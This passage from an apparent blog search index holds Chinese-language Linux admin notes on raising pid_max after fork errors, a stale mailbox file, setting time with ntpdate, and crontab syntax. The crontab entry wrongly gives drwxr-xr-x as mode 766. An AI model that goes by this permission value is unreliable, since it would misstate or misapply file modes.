    
    
    <tags>
      
      <tag>yunwei</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_fork_cannot_allocate_memory</title>
    <link href="/2024/04/03/yunwei/errors/error_fork_cannot_allocate_memory/"/>
    <url>/2024/04/03/yunwei/errors/error_fork_cannot_allocate_memory/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS6中终端中执行命令提示报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@web-<span class="hljs-number">54</span> vsftpd]<span class="hljs-comment"># service vsftpd status</span><br><span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>functions: fork: Cannot allocate memory<br><span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>functions: fork: Cannot allocate memory<br></code></pre></td></tr></table></figure><h2 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h2><p>系统进程数不足导致</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h3><h4 id="查看Linux最大进程数配置"><a href="#查看Linux最大进程数配置" class="headerlink" title="查看Linux最大进程数配置"></a>查看Linux最大进程数配置</h4><p>sysctl kernel.pid_max</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl kernel.pid_max</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">32768</span><br></code></pre></td></tr></table></figure><h4 id="查看当前Linux进程数"><a href="#查看当前Linux进程数" class="headerlink" title="查看当前Linux进程数"></a>查看当前Linux进程数</h4><p>ps -eLf | wc -l</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@web</span><span class="hljs-number">-54</span> vsftpd]<span class="hljs-meta"># ps -eLf | wc -l</span><br><span class="hljs-number">32610</span><br></code></pre></td></tr></table></figure><h3 id="具体解决方案"><a href="#具体解决方案" class="headerlink" title="具体解决方案"></a>具体解决方案</h3><p>进程数即将到设置的上线，修改最大进程数配置</p><h4 id="临时生效"><a href="#临时生效" class="headerlink" title="临时生效"></a>临时生效</h4><p>echo 1000000 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># echo 1000000 &gt; /proc/sys/kernel/pid_max</span><br><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl kernel.pid_max</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure><h4 id="长久生效"><a href="#长久生效" class="headerlink" title="长久生效"></a>长久生效</h4><p>echo “kernel.pid_max&#x3D;1000000” &gt;&gt; &#x2F;etc&#x2F;sysctl.conf</p><p>sysctl -p</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># echo &quot;kernel.pid_max=1000000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl -p</span><br><span class="hljs-attr">net.ipv4.ip_forward</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.rp_filter</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.accept_source_route</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.sysrq</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.core_uses_pid</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.tcp_syncookies</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-ip6tables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-iptables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-arptables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.msgmnb</span> = <span class="hljs-number">65536</span><br><span class="hljs-attr">kernel.msgmax</span> = <span class="hljs-number">65536</span><br><span class="hljs-attr">kernel.shmmax</span> = <span class="hljs-number">68719476736</span><br><span class="hljs-attr">kernel.shmall</span> = <span class="hljs-number">4294967296</span><br><span class="hljs-attr">kernel.panic</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.all.accept_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.accept_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.all.send_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.send_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.arp_ignore</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.arp_announce</span> = <span class="hljs-number">2</span><br><span class="hljs-attr">net.ipv4.conf.all.arp_ignore</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.all.arp_announce</span> = <span class="hljs-number">2</span><br><span class="hljs-attr">net.ipv4.ip_no_pmtu_disc</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_userdel_creating_mailbox_file_File_exists</title>
    <link href="/2024/04/03/yunwei/errors/error_userdel_creating_mailbox_file_File_exists/"/>
    <url>/2024/04/03/yunwei/errors/error_userdel_creating_mailbox_file_File_exists/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>useradd 新建用户后，使用 userdel删除，再次创建时提示以下错误</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">Creating mailbox <span class="hljs-keyword">file</span>: <span class="hljs-keyword">File</span> <span class="hljs-keyword">exists</span><br></code></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>删除 &#x2F;var&#x2F;spool&#x2F;mail 下对应用户名文件</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@webscan</span><span class="hljs-operator">-</span><span class="hljs-number">54</span> vsftpd]# ls <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>ftpuserftp  <span class="hljs-operator">-</span>l<br><span class="hljs-operator">-</span>rw<span class="hljs-operator">-</span>rw<span class="hljs-operator">----</span> <span class="hljs-number">1</span> <span class="hljs-number">640</span> mail <span class="hljs-number">0</span> <span class="hljs-type">Jan</span>  <span class="hljs-number">2</span> <span class="hljs-number">17</span>:<span class="hljs-number">54</span> <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>ftpuserftp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>data&amp;time</title>
    <link href="/2024/04/03/yunwei/commands/date&amp;time/"/>
    <url>/2024/04/03/yunwei/commands/date&amp;time/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>获取和设置主机日期时间</p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="获取主机当前时间"><a href="#获取主机当前时间" class="headerlink" title="获取主机当前时间"></a>获取主机当前时间</h3><p>date</p><p>date -R</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">ubuntu@VM-8-5-ubuntu:~$ date<br>Mon<span class="hljs-number"> 15 </span>Nov<span class="hljs-number"> 2021 </span>06:29:10 PM CST<br><br>(base) root@VM-8-5-ubuntu:~<span class="hljs-comment"># date -R</span><br>Thu,<span class="hljs-number"> 19 </span>May<span class="hljs-number"> 2022 </span>22:29:17 +0800<br><br>(base) [root@120 ~]<span class="hljs-comment"># date</span><br>Mon Nov<span class="hljs-number"> 15 </span>18:24:00 CST 2021<br></code></pre></td></tr></table></figure><h3 id="修改日期"><a href="#修改日期" class="headerlink" title="修改日期"></a>修改日期</h3><p>需要root权限</p><p><strong>sudo date -s “YYYY-MM-DD hh:mm[:ss]”</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:~$ sudo date -s <span class="hljs-string">&quot;2022-11-15 13:14:15&quot;</span><br><span class="hljs-attribute">Tue</span> <span class="hljs-number">15</span> Nov <span class="hljs-number">2022</span> <span class="hljs-number">01</span>:<span class="hljs-number">14</span>:<span class="hljs-number">15</span> PM CST<br></code></pre></td></tr></table></figure><h3 id="修改时间"><a href="#修改时间" class="headerlink" title="修改时间"></a>修改时间</h3><p>需要root权限</p><p><strong>sudo date -s hh:mm[:ss]</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:~$ sudo date -s <span class="hljs-number">19</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">Mon</span> <span class="hljs-number">15</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">07</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> PM CST<br></code></pre></td></tr></table></figure><h3 id="更新时间"><a href="#更新时间" class="headerlink" title="更新时间"></a>更新时间</h3><h4 id="安装-ntpdate"><a href="#安装-ntpdate" class="headerlink" title="安装 ntpdate"></a>安装 ntpdate</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> install ntpdate         # version <span class="hljs-number">1</span>:<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>p12+dfsg-<span class="hljs-number">3</span>ubuntu<span class="hljs-number">4.20.04.1</span>, or<br><br><span class="hljs-attribute">apt</span> install ntpsec-ntpdate  # version <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span>+dfsg1-<span class="hljs-number">4</span>build1<br></code></pre></td></tr></table></figure><h4 id="更新时间-1"><a href="#更新时间-1" class="headerlink" title="更新时间"></a>更新时间</h4><p>sudo ntpdate 时间服务器域名&#x2F;ip</p><h4 id="时间服务器"><a href="#时间服务器" class="headerlink" title="时间服务器"></a>时间服务器</h4><p>中国  cn.ntp.org.cn</p><p>中国教育网  edu.ntp.org.cn</p><p>中国香港  hk.ntp.org.cn</p><p>中国台湾  tw.ntp.org.cn</p><p>日本  jp.ntp.org.cn</p><p>韩国  kr.ntp.org.cn</p><p>新加坡  sgp.ntp.org.cn</p><p>美国  us.ntp.org.cn</p><p>阿里云 ntp.aliyun.com</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">(<span class="hljs-built_in">base</span>) root@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubun<span class="hljs-symbol">tu:</span>~# ntpdate cn.ntp.org.cn<br><span class="hljs-number">20</span> May <span class="hljs-symbol">00:04</span><span class="hljs-symbol">:16</span> ntpdate[<span class="hljs-number">1815</span>]<span class="hljs-symbol">:</span> adjust <span class="hljs-built_in">time</span> server <span class="hljs-number">120.25</span>.<span class="hljs-number">115.20</span> <span class="hljs-built_in">offset</span> <span class="hljs-number">0.262073</span> <span class="hljs-built_in">sec</span><br></code></pre></td></tr></table></figure><p>报错信息</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) root@VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu:/<span class="hljs-comment"># sudo ntpdate 120.25.115.20</span><br><span class="hljs-number">19</span> May <span class="hljs-number">22</span>:<span class="hljs-number">10</span>:<span class="hljs-number">28</span> ntpdate[<span class="hljs-number">978756</span>]: <span class="hljs-literal">no</span> server suitable <span class="hljs-keyword">for</span> synchronization found<br></code></pre></td></tr></table></figure><p>定时任务周期性更新时间</p><h3 id="时间自动更新配置"><a href="#时间自动更新配置" class="headerlink" title="时间自动更新配置"></a>时间自动更新配置</h3><h4 id="查看时间自动更新配置"><a href="#查看时间自动更新配置" class="headerlink" title="查看时间自动更新配置"></a>查看时间自动更新配置</h4><p>timedatectl show </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) root@VM-8-5-ubuntu:/# timedatectl show<br><span class="hljs-attribute">Timezone</span>=Asia/Shanghai<br><span class="hljs-attribute">LocalRTC</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">CanNTP</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">NTP</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">NTPSynchronized</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">TimeUSec</span>=Fri 2022-05-20 00:10:57 CST<br><span class="hljs-attribute">RTCTimeUSec</span>=Fri 2022-05-20 00:10:57 CST<br></code></pre></td></tr></table></figure><p>NTP参数标志是否自动更新</p><p>yes ：自动更新</p><p>no：不自动更新</p><p>开启自动更新</p><p>timedatectl set-ntp yes</p><p>报错信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) root@VM-8-5-ubuntu:/# timedatectl set-ntp <span class="hljs-literal">yes</span><br>Failed <span class="hljs-keyword">to</span> <span class="hljs-built_in">set</span> ntp:<span class="hljs-built_in"> NTP </span><span class="hljs-keyword">not</span> supported<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crontab</title>
    <link href="/2024/04/03/yunwei/commands/crontab/"/>
    <url>/2024/04/03/yunwei/commands/crontab/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>crontab(定时任务)，是系统为用户提供定时执行任务的功能。</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>不同版本的系统，都会在通用语法的之后再扩展一些语法</p><h3 id="crontab命令语法："><a href="#crontab命令语法：" class="headerlink" title="crontab命令语法："></a>crontab命令语法：</h3><p><strong>crontab [-u user] [-l | -r | -e] [-i] [-s]</strong></p><p><strong>-u user</strong>：指定用户，不指定表示当前用户，只有管理员才可以指定用户，普通用户使用-u会出现如下提示</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[test<span class="hljs-variable">@110</span> /]<span class="hljs-variable">$ </span>crontab -u apache -l<br>must be privileged to <span class="hljs-keyword">use</span> -u<br></code></pre></td></tr></table></figure><p><strong>-l</strong>：list的意思，查看定时任务列表</p><p><strong>-e</strong>：edit的意思，编辑指定定时任务，退出编辑状态之后会自动重新加载（reload）定时任务</p><p><strong>-r</strong>：remove的意思，删除定时任务，如果有权限就会直接删除</p><p><strong>-i</strong>：和-r搭配使用，会出现提示是否删除，输入y&#x2F;Y就会删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@110 root]$ crontab -r -i<br>crontab: really delete <span class="hljs-built_in">test</span><span class="hljs-string">&#x27;s crontab?</span><br></code></pre></td></tr></table></figure><p>centos7扩展语法，增加了对集群的支持，-c&#x2F;-n host</p><p>centos8扩展语法，增加了对集群的支持，-c&#x2F;-n host</p><p><strong>-V</strong>：显示版本</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@localhost</span> /]# cat /etc/redhat-<span class="hljs-keyword">release</span> <br>Red Hat Enterprise Linux <span class="hljs-keyword">release</span> <span class="hljs-number">8.3</span> (Ootpa)<br></code></pre></td></tr></table></figure><h2 id="crontab格式"><a href="#crontab格式" class="headerlink" title="crontab格式"></a>crontab格式</h2><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><p>* * * * * command(要运行的命令)</p><p># +—————- minute  分钟(0 - 59) </p><p># |  +————- hour    小时(0 - 23) </p><p># |  |  +———- day     日期(1 - 31) </p><p># |  |  |  +——- month   月份(1 - 12) </p><p># |  |  |  |  +—- week    星期(0 - 7) (星期天&#x3D;0 or 7) </p><p># |  |  |  |  | # *  *  *  *  *  要运行的命令**</p><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>* 表示允许范围内任意数字</p><p>&#x2F; 表示每单元，*&#x2F;5:每5个单元</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*<span class="hljs-string">/5</span> * * * * <span class="hljs-keyword">ls</span> <span class="hljs-comment">#每五分钟执行一次ls</span><br></code></pre></td></tr></table></figure><p>a-b 表示从a-b的数字</p><p>a,b,c 表示在a,b,c的时间点执行</p><p><strong>示例:</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">每天早上6点追加一条字符串到一个文本。<br>0 6 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Good morning.&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>每两个小时追加一条字符串一个文本。-<br>0 *<span class="hljs-string">/2</span> * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;two hours append text.&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>晚上11点到早上8点之间每两个小时，早上八点<br>0 23-7/2，8 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sleep&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点<br>0 11 4 * 1-3 <span class="hljs-keyword">command</span> line<br><br>1月1日早上4点<br>0 4 1 1 * <span class="hljs-keyword">command</span> line<br><br>每月每天每小时的第 0 分钟执行一次 <span class="hljs-string">/bin/ls</span><br>0 * * * * <span class="hljs-string">/bin/ls</span><br><br>在 12 月内, 每天的早上 6 点到 12 点中，每隔 20 分钟执行一次 <span class="hljs-string">/usr/bin/backup</span><br>*<span class="hljs-string">/20</span> 6-12 * 12 * <span class="hljs-string">/usr/bin/backup</span><br><br>周一到周五每天下午 5<span class="hljs-function">:00</span> 寄一封信给 alex_mail_name :<br>0 17 * * 1-5 mail -s <span class="hljs-string">&quot;hi&quot;</span> alex_mail_name &lt; <span class="hljs-string">/tmp/maildata</span><br><br>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分<span class="hljs-string">....</span>执行 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;haha&quot;</span><br>20 0-23/2 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;haha&quot;</span><br><br>晚上11点到早上8点之间每两个小时，早上8点,显示时间<br>0 23-7/2，8 * * * date<br></code></pre></td></tr></table></figure><h2 id="不同级别crontab"><a href="#不同级别crontab" class="headerlink" title="不同级别crontab"></a>不同级别crontab</h2><h4 id="用户crontab"><a href="#用户crontab" class="headerlink" title="用户crontab"></a>用户crontab</h4><p>&#x2F;var&#x2F;spool&#x2F;cron目录</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ cron]<span class="hljs-comment"># ls -lat /var/spool/cron</span><br>total 16<br>drwx------.<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Jun<span class="hljs-number"> 14 </span>11:35 .<br>-rw------- <span class="hljs-number"> 1 </span>test test  <span class="hljs-number"> 20 </span>Jun<span class="hljs-number"> 14 </span>11:35 test<br>-rw------- <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 20 </span>Jun <span class="hljs-number"> 6 </span>13:46 root<br>drwxr-xr-x.<span class="hljs-number"> 9 </span>root root<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 15 </span><span class="hljs-number"> 2017 </span>..<br></code></pre></td></tr></table></figure><p>目录权限：</p><p>​drwx——,也就是700，所属组为root:root,表示只有root有操作权限</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwx</span>------. <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">14</span> <span class="hljs-number">11</span>:<span class="hljs-number">25</span> cron/<br></code></pre></td></tr></table></figure><p>文件权限：</p><p>​-rw——-，也就是600，所属组为对应用户，表示只有对应对应用户有查看编辑权限（root,有所有权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-------  1 <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>   20 Jun 14 11:35 <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h4 id="主系统crontab"><a href="#主系统crontab" class="headerlink" title="主系统crontab"></a>主系统crontab</h4><p>&#x2F;etc&#x2F;crontab </p><p>文件权限为 -rw-r–r–，也就是644，表示任何用户都可以查看，但只有 root 可修改</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">[apache@110 cron]$ <span class="hljs-keyword">ls</span> -lat <span class="hljs-string">/etc/crontab</span><br>-rw-r<span class="hljs-params">--r--</span>. 1 root root 451 Jun 10  2014 <span class="hljs-string">/etc/crontab</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[apache<span class="hljs-variable">@110</span> cron]<span class="hljs-variable">$ </span>cat /etc/crontab<br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/bash</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br><br></code></pre></td></tr></table></figure><h4 id="周期性执行脚本目录"><a href="#周期性执行脚本目录" class="headerlink" title="周期性执行脚本目录"></a>周期性执行脚本目录</h4><p>&#x2F;etc&#x2F;cron.hourly:每小时执行</p><p>&#x2F;etc&#x2F;cron.daily:每天执行</p><p>&#x2F;etc&#x2F;cron.weekly:每周执行</p><p>&#x2F;etc&#x2F;cron.monthly:每月执行</p><p>目录权限均为drwxr-xr-x，也就是766</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxr</span>-xr-x. <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">10</span>  <span class="hljs-number">2014</span> /etc/cron.weekly<br></code></pre></td></tr></table></figure><h2 id="定时任务调用流程"><a href="#定时任务调用流程" class="headerlink" title="定时任务调用流程"></a>定时任务调用流程</h2><h5 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h5><p>ll &#x2F;etc&#x2F;cron.d</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">[apache@110 cron.weekly]$ ll /etc/cron.d<br>total 8<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 128 </span>Aug <span class="hljs-number"> 9 </span><span class="hljs-number"> 2019 </span>0hourly<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 235 </span>Apr <span class="hljs-number"> 1 </span><span class="hljs-number"> 2020 </span>sysstat<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;cron.d&#x2F;0hourly</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[apache<span class="hljs-variable">@110</span> cron.weekly]<span class="hljs-variable">$ </span>cat /etc/cron.d/0hourly<br><span class="hljs-comment"># Run the hourly jobs</span><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/bash</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-number">01</span> * * * * root run-parts /etc/cron.hourly<br></code></pre></td></tr></table></figure><p>ll &#x2F;etc&#x2F;cron.hourly&#x2F;</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@110 cron]<span class="hljs-comment"># ll /etc/cron.hourly/</span><br>total 4<br>-rwxr-xr-x<span class="hljs-number"> 1 